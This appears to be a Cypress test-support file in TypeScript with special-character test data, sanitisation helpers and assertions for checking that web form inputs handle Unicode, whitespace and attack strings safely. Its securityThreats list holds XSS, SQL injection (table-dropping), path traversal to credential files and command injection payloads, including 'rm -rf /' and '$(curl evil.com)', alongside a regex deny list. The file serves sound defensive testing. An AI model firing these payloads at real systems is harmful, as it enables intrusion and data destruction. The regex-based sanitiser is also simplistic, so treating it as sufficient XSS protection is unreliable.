// * Utility functions for handling special characters in input testing
// * Ensures proper sanitization and validation of special characters

/**
 * Collection of special character test cases
 */
export const SpecialCharacters = {
  // * Common special characters
  punctuation: '!@#$%^&*()_+-=[]{}|;\':",./<>?',
  
  // * Unicode characters
  unicode: {
    emoji: '😀😃😄😁😆😅🤣😂🙂🙃😉😊😇🥰😍🤩😘',
    chinese: '你好世界中文测试汉字输入',
    arabic: 'مرحبا بالعالم اختبار عربي',
    hebrew: 'שלום עולם בדיקה עברית',
    cyrillic: 'Привет мир тест кириллица',
    japanese: 'こんにちは世界日本語テスト',
    korean: '안녕하세요 세계 한글 테스트',
    hindi: 'नमस्ते दुनिया हिंदी परीक्षण',
    thai: 'สวัสดีชาวโลกทดสอบภาษาไทย',
    mathematical: '∀∂∃∄∅∆∇∈∉∊∋∌∍∎∏',
    arrows: '←↑→↓↔↕↖↗↘↙⇐⇑⇒⇓⇔⇕',
    currency: '¤$¢£¥₹€₽₨₩₪',
    fractions: '¼½¾⅐⅑⅒⅓⅔⅕⅖⅗⅘⅙⅚',
  },
  
  // * Control characters
  control: {
    tab: '\t',
    newline: '\n',
    carriageReturn: '\r',
    backspace: '\b',
    formFeed: '\f',
    verticalTab: '\v',
    null: '\0',
    escape: '\x1B',
  },
  
  // HTML entities
  htmlEntities: {
    lessThan: '&lt;',
    greaterThan: '&gt;',
    ampersand: '&amp;',
    quote: '&quot;',
    apostrophe: '&#39;',
    space: '&nbsp;',
    copyright: '&copy;',
    registered: '&reg;',
    trademark: '&trade;',
  },
  
  // ! SECURITY: * Potential security threats
  securityThreats: {
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
      '<body onload=alert("XSS")>',
    ],
    sqlInjection: [
      "'; DROP TABLE users; --",
      "1' OR '1' = '1",
      "admin'--",
      "' OR 1=1--",
      "1' UNION SELECT NULL--",
      "' OR 'x'='x",
      "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file:///etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    commandInjection: [
      '| ls -la',
      '; cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(curl evil.com)',
    ],
  },
  
  // * Whitespace variations
  whitespace: {
    spaces: '   ',
    tabs: '\t\t\t',
    mixed: ' \t \n \r ',
    nonBreaking: '\u00A0\u00A0\u00A0',
    zeroWidth: '\u200B\u200C\u200D\uFEFF',
    ideographic: '\u3000',
  },
  
  // * Confusing characters (homoglyphs)
  homoglyphs: {
    latinVsCyrillic: 'АВСЕНКМОРТХасеорух', // Cyrillic letters that look like Latin
    zeroVsO: '0OoО0о', // Zero vs letter O
    oneVsL: '1lIі|', // One vs L vs I
    similar: 'rn vs m, vv vs w, cl vs d',
  },
  
  // * Long strings with special characters
  longSpecial: {
    repeatedEmoji: '😀'.repeat(1000),
    mixedUnicode: '你😀א'.repeat(500),
    allSpecial: '!@#$%^&*()'.repeat(100),
  },
};

/**
 * Input sanitization helpers
 */
export const SanitizationHelpers = {
  /**
   * Remove dangerous HTML/script content
   */
  sanitizeHtml: (input: string): string => {
    return input
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, ''); // Remove event handlers
  },
  
  /**
   * Escape special characters for display
   */
  escapeSpecialChars: (input: string): string => {
    const escapeMap: Record<string, string> = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;',
      '/': '&#x2F;',
    };
    
    return input.replace(/[&<>"'/]/g, char => escapeMap[char]);
  },
  
  /**
   * Normalize whitespace
   */
  normalizeWhitespace: (input: string): string => {
    return input
      .replace(/[\u00A0\u200B-\u200D\uFEFF\u3000]/g, ' ') // Replace special spaces
      .replace(/\s+/g, ' ') // Collapse multiple spaces
      .trim();
  },
  
  /**
   * Remove control characters
   */
  removeControlChars: (input: string): string => {
    // eslint-disable-next-line no-control-regex
    return input.replace(/[\x00-\x1F\x7F]/g, '');
  },
  
  /**
   * Validate input doesn't contain dangerous patterns
   */
  validateSafe: (input: string): boolean => {
    const dangerousPatterns = [
      /<script/i,
      /<iframe/i,
      /javascript:/i,
      /on\w+\s*=/i,
      /DROP\s+TABLE/i,
      /UNION\s+SELECT/i,
      /\.\.\//, // Path traversal
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(input));
  },
};

/**
 * Custom Cypress commands for special character testing
 */
export const SpecialCharacterCommands = {
  /**
   * Type special characters with proper handling
   */
  typeSpecialChars: (selector: string, chars: string) => {
    // * Clear existing value
    cy.get(selector).clear();
    
    // * Type each character with proper escaping
    chars.split('').forEach(char => {
      if (char === '{' || char === '}') {
        // * Escape curly braces for Cypress
        cy.get(selector).type(`{${char}}`);
      } else if (char === '\n') {
        cy.get(selector).type('{enter}');
      } else if (char === '\t') {
        cy.get(selector).type('{tab}');
      } else {
        cy.get(selector).type(char);
      }
    });
    
    return cy.get(selector);
  },
  
  /**
   * Paste special characters (bypasses typing)
   */
  pasteSpecialChars: (selector: string, text: string) => {
    cy.get(selector)
      .clear()
      .invoke('val', text)
      .trigger('input')
      .trigger('change');
    
    return cy.get(selector);
  },
  
  /**
   * Test input with various special character sets
   */
  testWithSpecialCharSets: (selector: string, callback?: (value: string) => void) => {
    const testSets = [
      { name: 'punctuation', value: SpecialCharacters.punctuation },
      { name: 'emoji', value: SpecialCharacters.unicode.emoji },
      { name: 'chinese', value: SpecialCharacters.unicode.chinese },
      { name: 'arabic', value: SpecialCharacters.unicode.arabic },
      { name: 'mixed unicode', value: '😀你好мир' },
    ];
    
    testSets.forEach(({ name, value }) => {
      cy.log(`Testing with ${name}`);
      cy.get(selector).clear().type(value);
      callback?.(value);
      cy.get(selector).should('have.value', value);
    });
  },
  
  /**
   * Test security threats are handled safely
   */
  testSecurityThreats: (selector: string) => {
    const allThreats = [
      ...SpecialCharacters.securityThreats.xss,
      ...SpecialCharacters.securityThreats.sqlInjection,
      ...SpecialCharacters.securityThreats.pathTraversal,
      ...SpecialCharacters.securityThreats.commandInjection,
    ];
    
    allThreats.forEach(threat => {
      cy.get(selector).clear().invoke('val', threat).trigger('input');
      
      // * Verify no script execution
      cy.window().then(win => {
        cy.stub(win, 'alert').as('alertStub');
      });
      cy.get('@alertStub').should('not.have.been.called');
      
      // * Verify value is either sanitized or preserved safely
      cy.get(selector).invoke('val').should('exist');
    });
  },
};

/**
 * Assertions for special character handling
 */
export const SpecialCharacterAssertions = {
  /**
   * Assert input handles unicode correctly
   */
  assertUnicodeSupport: (selector: string) => {
    const unicodeTests = [
      SpecialCharacters.unicode.emoji,
      SpecialCharacters.unicode.chinese,
      SpecialCharacters.unicode.arabic,
      SpecialCharacters.unicode.mathematical,
    ];
    
    unicodeTests.forEach(text => {
      cy.get(selector).clear().type(text);
      cy.get(selector).should('have.value', text);
    });
  },
  
  /**
   * Assert input sanitizes dangerous content
   */
  assertSanitization: (selector: string) => {
    SpecialCharacters.securityThreats.xss.forEach(xss => {
      cy.get(selector).clear().invoke('val', xss).trigger('input');
      
      cy.get(selector).invoke('val').then(value => {
        // TODO: * Value should not contain script tags
        expect(value).to.not.include('<script');
        expect(value).to.not.include('javascript:');
      });
    });
  },
  
  /**
   * Assert whitespace is handled correctly
   */
  assertWhitespaceHandling: (selector: string, preserveWhitespace: boolean = false) => {
    const testCases = [
      { input: '  text  ', expected: preserveWhitespace ? '  text  ' : 'text' },
      { input: 'text\n\ntext', expected: preserveWhitespace ? 'text\n\ntext' : 'text text' },
      { input: '\t\ttext\t\t', expected: preserveWhitespace ? '\t\ttext\t\t' : 'text' },
    ];
    
    testCases.forEach(({ input, expected }) => {
      cy.get(selector).clear().invoke('val', input).trigger('input');
      
      if (preserveWhitespace) {
        cy.get(selector).should('have.value', expected);
      } else {
        cy.get(selector).invoke('val').then(value => {
          expect(value.trim()).to.equal(expected);
        });
      }
    });
  },
  
  /**
   * Assert input prevents XSS attacks
   */
  assertXSSPrevention: (selector: string) => {
    // * Set up alert spy
    cy.window().then(win => {
      cy.stub(win, 'alert').as('xssAlert');
      cy.stub(win, 'confirm').as('xssConfirm');
      cy.stub(win, 'prompt').as('xssPrompt');
    });
    
    // * Try various XSS payloads
    SpecialCharacters.securityThreats.xss.forEach(payload => {
      cy.get(selector).clear().invoke('val', payload).trigger('input').trigger('change');
    });
    
    // * Verify no alerts were triggered
    cy.get('@xssAlert').should('not.have.been.called');
    cy.get('@xssConfirm').should('not.have.been.called');
    cy.get('@xssPrompt').should('not.have.been.called');
  },
  
  /**
   * Assert correct character count with special chars
   */
  assertCharacterCount: (selector: string, countSelector: string) => {
    const testCases = [
      { text: 'Hello', expectedLength: 5 },
      { text: '😀😃😄', expectedLength: 3 }, // Emoji should count correctly
      { text: '你好', expectedLength: 2 }, // Chinese chars
      { text: 'Hello\nWorld', expectedLength: 11 }, // Newline counts
    ];
    
    testCases.forEach(({ text, expectedLength }) => {
      cy.get(selector).clear().type(text);
      cy.get(countSelector).should('contain', expectedLength.toString());
    });
  },
};

/**
 * Test data generators for special characters
 */
export const SpecialCharacterGenerators = {
  /**
   * Generate random special character string
   */
  randomSpecialString: (length: number = 10): string => {
    const chars = SpecialCharacters.punctuation + SpecialCharacters.unicode.emoji;
    let result = '';
    
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    return result;
  },
  
  /**
   * Generate mixed content string
   */
  mixedContent: (includeSpecial: boolean = true): string => {
    const parts = [
      'Normal text',
      includeSpecial ? SpecialCharacters.punctuation.substring(0, 5) : '',
      '123456',
      includeSpecial ? '😀' : '',
      'More text',
    ];
    
    return parts.filter(Boolean).join(' ');
  },
  
  /**
   * Generate test payload with all types
   */
  comprehensivePayload: (): string => {
    return [
      'Normal text',
      SpecialCharacters.punctuation,
      SpecialCharacters.unicode.emoji.substring(0, 5),
      SpecialCharacters.unicode.chinese.substring(0, 5),
      '<script>test</script>',
      "'; DROP TABLE users; --",
    ].join(' | ');
  },
};

// * Register custom Cypress commands
Cypress.Commands.add('typeSpecialChars', SpecialCharacterCommands.typeSpecialChars);
Cypress.Commands.add('pasteSpecialChars', SpecialCharacterCommands.pasteSpecialChars);
Cypress.Commands.add('testWithSpecialCharSets', SpecialCharacterCommands.testWithSpecialCharSets);
Cypress.Commands.add('testSecurityThreats', SpecialCharacterCommands.testSecurityThreats);

// * Type declarations
declare global {
  namespace Cypress {
    interface Chainable {
      typeSpecialChars(selector: string, chars: string): Chainable<Element>;
      pasteSpecialChars(selector: string, text: string): Chainable<Element>;
      testWithSpecialCharSets(selector: string, callback?: (value: string) => void): void;
      testSecurityThreats(selector: string): void;
    }
  }
}

export default {
  SpecialCharacters,
  SanitizationHelpers,
  SpecialCharacterCommands,
  SpecialCharacterAssertions,
  SpecialCharacterGenerators,
};